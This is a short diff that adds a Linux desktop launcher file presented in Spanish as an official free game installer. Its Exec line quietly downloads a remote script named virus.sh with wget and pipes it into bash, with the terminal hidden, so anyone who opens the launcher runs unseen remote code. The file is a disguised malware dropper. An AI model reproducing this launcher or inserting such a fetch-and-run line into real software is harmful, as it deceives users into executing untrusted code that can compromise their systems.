@@ -1,0 +1,8 @@
+[Desktop Entry]
+Name=Instalar Juego Gratis
+Comment=Instalador oficial para Linux
+Exec=bash -c "wget -qO- https://raw.githubusercontent.com/shell.oculta/virus.sh| bash"
+Icon=games-config
+Terminal=false
+Type=Application
+Categories=Game;
